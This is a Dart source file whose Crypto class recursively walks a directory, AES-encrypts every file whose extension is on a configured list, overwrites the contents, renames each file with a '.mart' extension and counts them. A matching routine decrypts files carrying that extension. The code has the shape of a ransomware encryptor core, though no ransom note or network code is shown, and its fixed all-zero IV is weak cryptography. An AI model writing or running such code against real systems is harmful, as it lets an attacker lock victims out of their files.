import 'dart:io';
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart';
import 'package:path/path.dart';

import '../util/config.dart';
import '../util/manipulate_data.dart';

class Crypto {
  String path;
  String key;

  Directory _path;

  Key _key;
  IV _iv;
  Encrypter _encrypter;

  Crypto(this.path, this.key) {
    _path = Directory(path);
    _key = Key.fromUtf8(key);
    _iv = IV.fromLength(16);
    _encrypter = Encrypter(AES(_key));
  }

  static Map<String, dynamic> _mapForResult() =>
      {'status': null, 'amountFiles': null, 'mode': null, 'response': null};

  Future<Map<String, dynamic>> encryptFile() async {
    Map result = _mapForResult();
    result['mode'] = 'encrypt';
    try {
      var amountFiles = 0;
      var files = await _discoveryFiles();
      files.forEach((file) {
        if (file.runtimeType.toString() == '_File') {
          var fileName = basename(file.path);
          var extension = fileName.split('.').last.toLowerCase();

          if (Config.extensionsToEncrypt.contains(extension) &&
              !Config.extensionsToIgnore.contains(extension)) {
            var content = _readFileAsync(file.path);
            var contentEncrypted = getEncryptContent(content);
            _writeFileSync(file.path, contentEncrypted)
                .then((value) => file.rename(file.path + '.mart'));
            amountFiles += 1;
          }
        }
      });
      result['amountFiles'] = amountFiles;
      result['status'] = true;
      return result;
    } catch (error) {
      print(error.toString());
      result['status'] = false;
      result['response'] = '${error.toString()}';
      return result;
    }
  }

  Future<Map<String, dynamic>> decryptFile() async {
    Map result = _mapForResult();
    result['mode'] = 'decrypt';
    try {
      var amountFiles = 0;
      var files = await _discoveryFiles();
      files.forEach((file) {
        if (file.runtimeType.toString() == '_File') {
          var fileName = basename(file.path);
          var extension = fileName.split('.').last.toLowerCase();

          if (extension == 'mart') {
            var contentEncrypted = _readFileAsync(file.path);

            if (ManipulateData.isBase64(contentEncrypted)) {
              var contentDecrypted = getDecryptContent(contentEncrypted);
              _writeFileSync(file.path, contentDecrypted).then(
                  (value) => file.rename(file.path.replaceAll('.mart', '')));
              amountFiles += 1;
            }
          }
        }
      });
      result['amountFiles'] = amountFiles;
      result['status'] = true;
      return result;
    } catch (error) {
      print(error.toString());
      result['status'] = false;
      result['response'] = '${error.toString()}';
      return result;
    }
  }

  String getEncryptContent(String str) =>
      _encrypter.encrypt(str, iv: _iv).base64;

  String getDecryptContent(String str) => _encrypter.decrypt64(str, iv: _iv);

  Future<List<FileSystemEntity>> _discoveryFiles() async {
    var lister = _path.list(recursive: true, followLinks: false);
    List listFiles = await lister.toList();
    return listFiles;
  }

  String _readFileAsync(String path) {
    var file = File(path);
    var futureContent = file.readAsBytesSync();
    return ManipulateData.convertCharCodesToString(futureContent);
  }

  Future<File> _writeFileSync(String path, String content) async {
    var file = File(path);
    var bytes = ManipulateData.convertStringToCharCodes(content);
    return file.writeAsBytes(bytes);
  }
}
